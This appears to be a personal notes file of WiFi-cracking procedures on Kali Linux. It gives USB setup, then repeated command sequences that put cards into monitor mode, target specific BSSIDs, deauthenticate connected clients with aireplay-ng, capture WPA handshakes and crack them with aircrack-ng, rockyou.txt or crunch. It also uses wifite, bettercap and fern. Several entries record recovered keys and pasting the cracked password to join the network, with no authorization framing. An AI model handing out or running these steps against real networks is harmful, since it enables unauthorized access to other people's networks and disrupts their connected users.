# Kali

alfa
tenda
panda
tp-link
long range wifi antenna


airmon-ng
ifconfig

download kali
https://rufus.ie
  download

rufus
  boot selection = kali-linux.iso
  start, write in DD image mode, ok

restart
shift or f8
use a device = uefi: sandisk

security boot = disabled, f10, yes
shift or f8
use a device = uefi: sandisk

---

## install kali on linux

kali linux live download
rufus portable download

rufus 
  run as administrator, no
  select = kali linux iso
  persistent partition size = 10gb
  start, yes, ok

reboot and boot into kali linux live persistence usb
  uefi: sandisk, pratition 1
  live system (persistence, check kali.org/prst)
  check wifi
  create a folder then reboot

```bash
nano /etc/apt/sources.list
sudo apt-get update
```
    

---

https://github.com/derv82/wifite2
wifite
  ctrl+c
  1, 7

---

cat words.txt

fernwifi cracker
  wlan0, ok
  wifi wep
  wifi wpa
    wifi-name, attack, ok
  key database
   

---

## not done

ifconfig
bettercap -iface wlan0
help
wifi.recon on
wifi.show
set wifi.recon.channel 3
set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap
net.sniff on
wifi.show
copy BSSID = e0:8e:3c:14:10:60
wifi.deauth e0:8e:3c:14:10:60
exit


home, wpa.pcap = wireshark

---

airmon-ng
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 2 --bssid 00:90:4C:08:00:0D -w /root/Desktop/DIR615 wlan0mon
new terminal
aireplay-ng -0 0 -a 00:90:4C:08:00:0D wlan0mon
wait for WPA handshake
cd Desktop
aircrack-ng -w rockyou.txt DIR615-01.cap
KEY FOUND!
airmon-ng stop wlan0mon

---

wifite
  5 Asraf
  cracked wps pin: 38271021
  cracked wps psk: asraf123

---

airmon-ng start wlan1
iwconfig
airodump-ng wlan1mon
airodump-ng --bssid C0:5E:79:FF:07:73 -c 13 --write dream101 wlan1mon
new terminal
aireplay-ng --deauth 10 -a C0:5E:79:FF:07:73 -c 24:18:1D:61:F8:44 wlan1mon
WPA handshake

ls
locate rockyou.txt
cp /usr/share/wordlists/rockyou.txt.gz /root/Documents.password/rockyou.txt

aircrack-ng dream101-01.cap -w /root/Documents/.password/rockyou.txt
KEY FOUND! 

---

https://github.com/derv82/wifite2

wifite -h
wifite
  ctrl + c
  6,2

---

airmon-ng start wlan0
kill 664
kill 736
kill 768
airodump-ng wlan0mon
airodump-ng --bssid 68:92:34:2b:AA:38 --c 11 --w hack wlan0mon
new terminal
aireplay-ng -0 0 -a 68:92:34:2b:AA:38 wlan0mon
WPA handshake
aircrack-ng -w '/root/Desktop/rockyou.txt' hack-01.cap
KEY FOUND!

---

cp /usr/share/wordlists/rockyou.txt.gz .
ls
gunzip rockyou.txt.gz
ls
wc -l rockyou.txt
cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > newrockyou.txt
ls
wc -l newrockyou.txt

---

airmon-ng
airmon-ng start wlan0
airmon-ng
airodump-ng wlan0mon
new terminal
airodump-ng -c 1 --bssid A4:91:B1:34:B1:A3 -w /home/kali/Desktop wlan0mon
new terminal
aireplay-ng -0 2 -a A4:91:B1:34:B1:A3 -c 18:21:95:00:4B:4B wlan0mon
WPA handshake
aircrack-ng -a2 -b A4:91:B1:34:B1:A3 -w /home/kali/Desktop/ligns.txt /home/kali/Desktop/*.cap
KEY FOUND!

---

wifite -h
wifite
  5
airmon-ng stop wlan0mon
copy psk and paste in wifi password

---

gzip -d /usr/share/wordlists/rockyou.txt.gz

gzip -d rockyou.txt.gz

---

airmon-ng
airmon-ng start wlan0
airmon-ng check kill
ip link set wlan0 down
iw dev wlan0 set type monitor
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 3 --bssid B4:43:26:5C:1F:F8 -w /root/Desktop/ wlan0mon
new terminal
aireplay-ng -0 0 -a B4:43:26:5C:1F:F8 -c 1C:36:BB:30:66:FE wlan0mon
aireplay-ng -0 2 -a B4:43:26:5C:1F:F8 -c 1C:36:BB:30:66:FE wlan0mon
WPA handshake
aircrack-ng -a2 -b B4:43:26:5C:1F:F8 -w /root/Desktop/rockyou.txt /root/Desktop/*.cap

---

wifite
 ctrl + c
locate rockyou
cp /usr/share/worldlists/rockyou.txt.gz /root/Desktop/
extract
copy a words inside the rockyou.txt and add Haktools1, save as tesfile
wifite --dict /root/Desktop/testfile
  ctrl + c
  3
  Haktools1

---


wifite
  1
aircrack-ng -b 9C:65:EE:50:11:C7 /home/kali/Desktop/handshake.cap -w /home/kali/Desktop/rockyou.txt
KEY FOUND
airmon-ng stop wlan0mon

---

airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 10 -b 98:DE:D0:4B:D2:88 -w hack1 wlan0mon
new terminal
aireplay-ng -0 5 -a 98:DE:D0:4B:D2:88 -c 04:B1:67:C2:31:F7 wlan0mon
WPA handshake
new terminal
crunch 0 8 0123456789 | aircrack-ng -b 98:DE:D0:4B:D2:88 -w- hack1-01.cap
KEY FOUND!

---

